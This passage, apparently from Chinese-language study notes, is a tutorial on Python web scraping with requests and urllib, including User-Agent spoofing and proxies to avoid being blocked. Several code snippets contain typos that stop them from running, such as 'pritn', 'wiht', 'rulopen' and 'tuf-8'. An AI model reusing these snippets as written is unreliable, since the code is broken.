href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;bdorz&#x2F;login.gif?login&amp;tpl&#x3D;mn&amp;u&#x3D;&#39;+ encodeURIComponent(window.location.href+ (window.location.search &#x3D;&#x3D;&#x3D; &quot;&quot; ? &quot;?&quot; : &quot;&amp;&quot;)+ &quot;bdorz_come&#x3D;1&quot;)+ &#39;&quot; name&#x3D;&quot;tj_login&quot; class&#x3D;&quot;lb&quot;&gt;ç»å½&lt;&#x2F;a&gt;&#39;);&lt;&#x2F;script&gt; &lt;a href&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;more&#x2F; name&#x3D;tj_briicon class&#x3D;bri style&#x3D;&quot;display: block;&quot;&gt;æ´å¤äº§å&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;ftCon&gt; &lt;div id&#x3D;ftConw&gt; &lt;p id&#x3D;lh&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;home.baidu.com&gt;å³äºç¾åº¦&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;ir.baidu.com&gt;About Baidu&lt;&#x2F;a&gt; &lt;&#x2F;p&gt; &lt;p id&#x3D;cp&gt;&amp;copy;2017&amp;nbsp;Baidu&amp;nbsp;&lt;a href&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;duty&#x2F;&gt;ä½¿ç¨ç¾åº¦åå¿è¯»&lt;&#x2F;a&gt;&amp;nbsp; &lt;a href&#x3D;http:&#x2F;&#x2F;jianyi.baidu.com&#x2F; class&#x3D;cp-feedback&gt;æè§åé¦&lt;&#x2F;a&gt;&amp;nbsp;äº¬ICPè¯030173å·&amp;nbsp; &lt;img src&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;gs.gif&gt; &lt;&#x2F;p&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#打印响应头，是字典状态</span><br><span class="line">&gt;&gt;&gt; print(response.headers)</span><br><span class="line">&#123;&#39;Cache-Control&#39;: &#39;private, no-cache, no-store, proxy-revalidate, no-transform&#39;, &#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Content-Encoding&#39;: &#39;gzip&#39;, &#39;Content-Type&#39;: &#39;text&#x2F;html&#39;, &#39;Date&#39;: &#39;Mon, 27 Jan 2020 05:20:09 GMT&#39;, &#39;Last-Modified&#39;: &#39;Mon, 23 Jan 2017 13:27:32 GMT&#39;, &#39;Pragma&#39;: &#39;no-cache&#39;, &#39;Server&#39;: &#39;bfe&#x2F;1.0.8.18&#39;, &#39;Set-Cookie&#39;: &#39;BDORZ&#x3D;27315; max-age&#x3D;86400; domain&#x3D;.baidu.com; path&#x3D;&#x2F;&#39;, &#39;Transfer-Encoding&#39;: &#39;chunked&#39;&#125;</span><br><span class="line"></span><br><span class="line">#打印相应状态，200表示成功，也就是正常的请求了百度</span><br><span class="line">&gt;&gt;&gt; print(response.status_code)</span><br><span class="line">200</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;)</span><br><span class="line"></span><br><span class="line">#重新的发起一次请求，这次请求就携带了headers信息</span><br><span class="line">&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;,headers&#x3D;headers)</span><br><span class="line"></span><br><span class="line">#在这里将响应打印，发现响用的状态码还是200，表示这次请求也是成功的</span><br><span class="line">&gt;&gt;&gt; print(response.status_code)</span><br><span class="line">200</span><br></pre></td></tr></table></figure>

<h5 id="爬虫可以抓取怎么的数据"><a href="#爬虫可以抓取怎么的数据" class="headerlink" title="爬虫可以抓取怎么的数据"></a>爬虫可以抓取怎么的数据</h5><h5 id="1、网页文本：如HTML文档、Json格式文本等"><a href="#1、网页文本：如HTML文档、Json格式文本等" class="headerlink" title="1、网页文本：如HTML文档、Json格式文本等"></a>1、网页文本：如HTML文档、Json格式文本等</h5><h5 id="2、图片：获取到的是二进制文件，保存为图片格式。"><a href="#2、图片：获取到的是二进制文件，保存为图片格式。" class="headerlink" title="2、图片：获取到的是二进制文件，保存为图片格式。"></a>2、图片：获取到的是二进制文件，保存为图片格式。</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">爬取图片</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">#用request中的get获得这个图片的URL</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;baidu_resultlogo@2.png&#39;)</span><br><span class="line">#以二进制形式打印response的内容出来</span><br><span class="line">&gt;&gt;&gt; print(response.content)</span><br><span class="line"></span><br><span class="line">#打开要保存图片的磁盘，给图片命名，以写入的方式打开二进制，</span><br><span class="line">&gt;&gt;&gt; with open(&#39;D:&#x2F;&#x2F;1.gif&#39;,&#39;wb&#39;) as f:</span><br><span class="line">	#写入response的内容</span><br><span class="line">	f.write(response.content)</span><br><span class="line">	#关闭文件</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>

<h5 id="3、视频：同为二进制文件，保存为视频格式即可。"><a href="#3、视频：同为二进制文件，保存为视频格式即可。" class="headerlink" title="3、视频：同为二进制文件，保存为视频格式即可。"></a>3、视频：同为二进制文件，保存为视频格式即可。</h5><h5 id="4、其他：只要是能请求到的，都能获取"><a href="#4、其他：只要是能请求到的，都能获取" class="headerlink" title="4、其他：只要是能请求到的，都能获取"></a>4、其他：只要是能请求到的，都能获取</h5><h5 id="解析方式"><a href="#解析方式" class="headerlink" title="解析方式"></a>解析方式</h5><h5 id="1、直接处理"><a href="#1、直接处理" class="headerlink" title="1、直接处理"></a>1、直接处理</h5><h5 id="2、Json解析"><a href="#2、Json解析" class="headerlink" title="2、Json解析"></a>2、Json解析</h5><h5 id="3、正则表达式"><a href="#3、正则表达式" class="headerlink" title="3、正则表达式"></a>3、正则表达式</h5><p>4、BeautifulSoup</p>
<p>5、PyQuery</p>
<p>6、XPath</p>
<h5 id="为什么我抓到的和浏览器看到的不一样"><a href="#为什么我抓到的和浏览器看到的不一样" class="headerlink" title="为什么我抓到的和浏览器看到的不一样"></a>为什么我抓到的和浏览器看到的不一样</h5><h5 id="怎样解决JavaScript渲染问题"><a href="#怎样解决JavaScript渲染问题" class="headerlink" title="怎样解决JavaScript渲染问题"></a>怎样解决JavaScript渲染问题</h5><ul>
<li>分析 Ajax请求</li>
<li>selenium/webdriver</li>
</ul>
<h5 id="怎样保存数据"><a href="#怎样保存数据" class="headerlink" title="怎样保存数据"></a>怎样保存数据</h5><p>1、文本：纯文本，Json，Xml等</p>
<p>2、关系型数据库：MySQL、Oracle、SQLServer等具有结构化表结构形式存储</p>
<p>3、非关系型数据库：MongoDB、Redis等Key-Value形式存储</p>
<p>4、二进制文件：图片，视频，音频等直接保存成特定格式即可</p>
<h4 id="Urllib库"><a href="#Urllib库" class="headerlink" title="Urllib库"></a>Urllib库</h4><h5 id="python内置的HTTP请求库"><a href="#python内置的HTTP请求库" class="headerlink" title="python内置的HTTP请求库"></a>python内置的HTTP请求库</h5><h5 id="urllib-request-请求模块"><a href="#urllib-request-请求模块" class="headerlink" title="urllib.request    请求模块"></a>urllib.request    请求模块</h5><h5 id="urllib-error-异常处理模块"><a href="#urllib-error-异常处理模块" class="headerlink" title="urllib.error        异常处理模块"></a>urllib.error        异常处理模块</h5><h5 id="urllib-parse-url解析模块"><a href="#urllib-parse-url解析模块" class="headerlink" title="urllib.parse        url解析模块"></a>urllib.parse        url解析模块</h5><h5 id="urllib-robotparser-rebots-txt解析模块"><a href="#urllib-robotparser-rebots-txt解析模块" class="headerlink" title="urllib.robotparser    rebots.txt解析模块"></a>urllib.robotparser    rebots.txt解析模块</h5><h5 id="把网页请求下来"><a href="#把网页请求下来" class="headerlink" title="把网页请求下来"></a>把网页请求下来</h5><h5 id="urllib-request-urlopen"><a href="#urllib-request-urlopen" class="headerlink" title="urllib.request.urlopen()"></a>urllib.request.urlopen()</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">#请求打开百度这个网站，将数据赋值给respones</span><br><span class="line">respones &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">#阅读百度源代码</span><br><span class="line">print(respones.read().decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">data &#x3D; bytes(urllib.parse.urlencode(&#123;&#39;word&#39;:&#39;hello&#39;&#125;),encoding &#x3D; &#39;utf-8&#39;)</span><br><span class="line">respones &#x3D; urllib.request.urlopen(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data)</span><br><span class="line">print(respones.read())</span><br><span class="line"></span><br><span class="line">b&#39;&#123;\n  &quot;args&quot;: &#123;&#125;, \n  &quot;data&quot;: &quot;&quot;, \n  &quot;files&quot;: &#123;&#125;, \n  &quot;form&quot;: &#123;\n    &quot;word&quot;: &quot;hello&quot;\n  &#125;, \n  &quot;headers&quot;: &#123;\n    &quot;Accept-Encoding&quot;: &quot;identity&quot;, \n    &quot;Content-Length&quot;: &quot;10&quot;, \n    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, \n    &quot;Host&quot;: &quot;httpbin.org&quot;, \n    &quot;User-Agent&quot;: &quot;Python-urllib&#x2F;3.8&quot;, \n    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2ed849-e71b483cf9d302cdd04052a1&quot;\n  &#125;, \n  &quot;json&quot;: null, \n  &quot;origin&quot;: &quot;112.226.8.246&quot;, \n  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;\n&#125;\n&#39;</span><br></pre></td></tr></table></figure>

<h5 id="设置超时时间"><a href="#设置超时时间" class="headerlink" title="设置超时时间"></a>设置超时时间</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;,timeout &#x3D; 1)</span><br><span class="line">print(response.read())</span><br><span class="line"></span><br><span class="line">b&#39;&#123;\n  &quot;args&quot;: &#123;&#125;, \n  &quot;headers&quot;: &#123;\n    &quot;Accept-Encoding&quot;: &quot;identity&quot;, \n    &quot;Host&quot;: &quot;httpbin.org&quot;, \n    &quot;User-Agent&quot;: &quot;Python-urllib&#x2F;3.8&quot;, \n    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2ed91e-9795fe0068ea47d0c32daea0&quot;\n  &#125;, \n  &quot;origin&quot;: &quot;112.226.8.246&quot;, \n  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;\n&#125;\n&#39;</span><br></pre></td></tr></table></figure>

<h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><h5 id="响应类型"><a href="#响应类型" class="headerlink" title="响应类型"></a>响应类型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">print(response.status)</span><br><span class="line"></span><br><span class="line">200</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.python.org&quot;)</span><br><span class="line"></span><br><span class="line">#read就是获取响应体的内容，这个响应体的内容是要给字节流形式，然后用decode进行解码转成utf-8</span><br><span class="line">print(response.read().decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>

<h5 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">request &#x3D; urllib.request.Request(&quot;http:&#x2F;&#x2F;python.org&quot;)</span><br><span class="line">response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">print(response.read()).decode(&#39;utf-8&#39;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request,parse</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;网址&#39;</span><br><span class="line">headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;对应&#39;&#125;</span><br><span class="line"></span><br><span class="line">dict &#x3D; &#123;&#39;name&#39;:&#39;Germey&#39;&#125;</span><br><span class="line">data &#x3D; bytes(parse.urlencode(dict),encoding&#x3D;&quot;utf-8&quot;)</span><br><span class="line">req &#x3D; request.Request(url&#x3D;url,data&#x3D;data,headers&#x3D;header,method&#x3D;&#39;POST&#39;)</span><br><span class="line">response &#x3D; request.rulopen(req)</span><br><span class="line">print(response.read().decode(&#39;tuf-8&#39;))</span><br></pre></td></tr></table></figure>

<h5 id="Handler"><a href="#Handler" class="headerlink" title="Handler"></a>Handler</h5><h5 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以伪装自己的IP地址，服务器识别的IP就是代理的ip</span><br><span class="line"></span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">proxy_handler &#x3D; rullib,request.ProxyHandler(&#123;&#39;http&#39;&#39;http:&#x2F;&#x2F;127.0.0.1:9743&#39;&#125;)</span><br><span class="line">opener &#x3D; urllib.reuqest.build_opener(proxy_handler)</span><br><span class="line">response &#x3D; opener.open(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;)</span><br><span class="line">pritn(response.read())</span><br></pre></td></tr></table></figure>

<h5 id="URL解析"><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h5><h5 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580132124441.png" alt="1580132124441"></p>
<h4 id="Requsets"><a href="#Requsets" class="headerlink" title="Requsets"></a>Requsets</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入 requests 模块</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 接收百度这个网址，传给变量response</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#x2F;&#39;)</span><br><span class="line"># 查看response格式</span><br><span class="line">&gt;&gt;&gt; print(type(response))</span><br><span class="line"># 打印response的状态码</span><br><span class="line">&gt;&gt;&gt; print(response.status_code)</span><br><span class="line"># 查看response的文本类型</span><br><span class="line">&gt;&gt;&gt; print(type(response.text))</span><br><span class="line"># 打印response文本</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h4><h4 id="基本GET请求"><a href="#基本GET请求" class="headerlink" title="基本GET请求"></a>基本GET请求</h4><h5 id="基本写法"><a href="#基本写法" class="headerlink" title="基本写法"></a>基本写法</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这是最简单的get请求</span><br><span class="line"></span><br><span class="line"># 导入 requests 模块</span><br><span class="line">&gt;&gt;&gt;import requests</span><br><span class="line"># 请求接收 httpbin网址</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&quot;http:&#x2F;&#x2F;www.httpbin.org&#x2F;get&quot;)</span><br><span class="line"># 打印 response文本</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="带参数GET请求"><a href="#带参数GET请求" class="headerlink" title="带参数GET请求"></a>带参数GET请求</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># GET请求参数就要拼接到URL后面用？问好分隔，将参数传过来用&amp;分隔</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get?name&#x3D;germey&amp;age&#x3D;22&#39;)</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<p>以上方法是比较繁琐的，resquests提供了一个非常简单的参数。这个参数叫params</p>
<h4 id="将params传入一个字典形式，这样也可以构造一个GET形式参数"><a href="#将params传入一个字典形式，这样也可以构造一个GET形式参数" class="headerlink" title="将params传入一个字典形式，这样也可以构造一个GET形式参数"></a>将params传入一个字典形式，这样也可以构造一个GET形式参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germty&#39;,&#39;age&#39;:22&#125;</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;,params &#x3D; data)</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="解析json"><a href="#解析json" class="headerlink" title="解析json"></a>解析json</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;)</span><br><span class="line"># 解析前 他是str格式</span><br><span class="line">&gt;&gt;&gt; print(type(response.text))</span><br><span class="line">&lt;class &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print(response.json())</span><br><span class="line"># 解析后 他是dict格式</span><br><span class="line">&gt;&gt;&gt; print(type(response.json()))</span><br><span class="line">&lt;class &#39;dict&#39;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="获取二进制数据"><a href="#获取二进制数据" class="headerlink" title="获取二进制数据"></a>获取二进制数据</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 获取图片网址</span><br><span class="line">&gt;&gt;&gt; response &#x3D; request.get(&quot;https:&#x2F;&#x2F;images2017.cnblogs.com&#x2F;blog&#x2F;777527&#x2F;201712&#x2F;777527-20171206153020144-701297613.png&quot;)</span><br><span class="line"># 以二进制形式打开并保存图片路径</span><br><span class="line">&gt;&gt;&gt; wiht open(&quot;D:&#x2F;&#x2F;json.jpg&quot;,&quot;wb&quot;) as f:</span><br><span class="line"># 写入其二进制内容</span><br><span class="line">	f.write(response.content)</span><br><span class="line"># 关闭文件</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>

<h4 id="添加headers"><a href="#添加headers" class="headerlink" title="添加headers"></a>添加headers</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果不加headers会被网站屏蔽</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.zhihu.com&#x2F;explore&#39;)</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body bgcolor&#x3D;&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;openresty&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加上headers就可以查看response的文本</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.zhihu.com&#x2F;explore&#39;,headers &#x3D; headers)</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="基本POST请求"><a href="#基本POST请求" class="headerlink" title="基本POST请求"></a>基本POST请求</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 设置data参数</span><br><span class="line">&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germey&#39;,&#39;age&#39;:&#39;22&#39;&#125;</span><br><span class="line"># 进行post请求</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data,headers &#x3D; headers)</span><br><span class="line"># 打印response文本</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br><span class="line"></span><br><span class="line"># 这里打印的文本是str格式</span><br><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;data&quot;: &quot;&quot;, </span><br><span class="line">  &quot;files&quot;: &#123;&#125;, </span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;age&quot;: &quot;22&quot;, </span><br><span class="line">    &quot;name&quot;: &quot;germey&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;, </span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, </span><br><span class="line">    &quot;Content-Length&quot;: &quot;18&quot;, </span><br><span class="line">    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2fdea2-a2bd0afafc4743c2926d9b9f&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;json&quot;: null, </span><br><span class="line">  &quot;origin&quot;: &quot;112.226.8.246&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 设置data参数</span><br><span class="line">&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germey&#39;,&#39;age&#39;:&#39;22&#39;&#125;</span><br><span class="line"># 设置headers</span><br><span class="line">&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line"># 进行psot请求</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data,headers &#x3D; headers)</span><br><span class="line"># 解析response</span><br><span class="line">&gt;&gt;&gt; print(response.json())</span><br><span class="line"></span><br><span class="line"># 解析之后就变成了dick格式</span><br><span class="line">&#123;&#39;args&#39;: &#123;&#125;, &#39;data&#39;: &#39;&#39;, &#39;files&#39;: &#123;&#125;, &#39;form&#39;: &#123;&#39;age&#39;: &#39;22&#39;, &#39;name&#39;: &#39;germey&#39;&#125;, &#39;headers&#39;: &#123;&#39;Accept&#39;: &#39;*&#x2F;*&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Content-Length&#39;: &#39;18&#39;, &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;, &#39;Host&#39;: &#39;httpbin.org&#39;, &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;, &#39;X-Amzn-Trace-Id&#39;: &#39;Root&#x3D;1-5e2fde03-cae7a73c2ed8eed413526372&#39;&#125;, &#39;json&#39;: None, &#39;origin&#39;: &#39;112.226.8.246&#39;, &#39;url&#39;: &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="响应-1"><a href="#响应-1" class="headerlink" title="响应"></a>响应</h3><h4 id="response属性"><a href="#response属性" class="headerlink" title="response属性"></a>response属性</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 隐藏服务器，防止屏蔽</span><br><span class="line">&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.jianshu.com&#39;，headers &#x3D; headers)</span><br><span class="line"># 打印状态码</span><br><span class="line">&gt;&gt;&gt; print(type(response.status_code),response.status_code)</span><br><span class="line"># 打印headers</span><br><span class="line">&gt;&gt;&gt; print(type(response.headers),response.headers)</span><br><span class="line"># 打印cookies</span><br><span class="line">&gt;&gt;&gt; print(type(response.cookies),response.cookies)</span><br><span class="line"># 打印url网址</span><br><span class="line">&gt;&gt;&gt; print(type(response.url),response.url)</span><br><span class="line"># 打印history也就是历史清单</span><br><span class="line">&gt;&gt;&gt; print(type(response.history),response.history)</span><br></pre></td></tr></table></figure>

<h4 id="状态码判断"><a href="#状态码判断" class="headerlink" title="状态码判断"></a>状态码判断</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一些常见的状态码为：</span><br><span class="line">200 - 服务器成功返回网页 </span><br><span class="line">404 - 请求的网页不存在 </span><br><span class="line">503 - 服务不可用 </span><br><span class="line">详细分解：</span><br><span class="line">1xx（临时响应） </span><br><span class="line">表示临时响应并需要请求者继续执行操作的状态代码。</span><br><span class="line">代码 说明 </span><br><span class="line">100 （继续） 请求者应当继续提出请求。服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。 </span><br><span class="line">101 （切换协议） 请求者已要求服务器切换协议，服务器已确认并准备切换。</span><br><span class="line">2xx （成功） </span><br><span class="line">表示成功处理了请求的状态代码。</span><br><span class="line">代码 说明 </span><br><span class="line">200 （成功） 服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 </span><br><span class="line">201 （已创建） 请求成功并且服务器创建了新的资源。 </span><br><span class="line">202 （已接受） 服务器已接受请求，但尚未处理。 </span><br><span class="line">203 （非授权信息） 服务器已成功处理了请求，但返回的信息可能来自另一来源。 </span><br><span class="line">204 （无内容） 服务器成功处理了请求，但没有返回任何内容。 </span><br><span class="line">205 （重置内容） 服务器成功处理了请求，但没有返回任何内容。 </span><br><span class="line">206 （部分内容） 服务器成功处理了部分 GET 请求。</span><br><span class="line">3xx （重定向） </span><br><span class="line">表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</span><br><span class="line">代码 说明 </span><br><span class="line">300 （多种选择） 针对请求，服务器可执行多种操作。服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 </span><br><span class="line">301 （永久移动） 请求的网页已永久移动到新位置。服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。 </span><br><span class="line">302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 </span><br><span class="line">303 （查看其他位置） 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。 </span><br><span class="line">304 （未修改） 自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 </span><br><span class="line">305 （使用代理） 请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。 </span><br><span class="line">307 （临时重定向） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</span><br><span class="line">4xx（请求错误） </span><br><span class="line">这些状态代码表示请求可能出错，妨碍了服务器的处理。</span><br><span class="line">代码 说明 </span><br><span class="line">400 （错误请求） 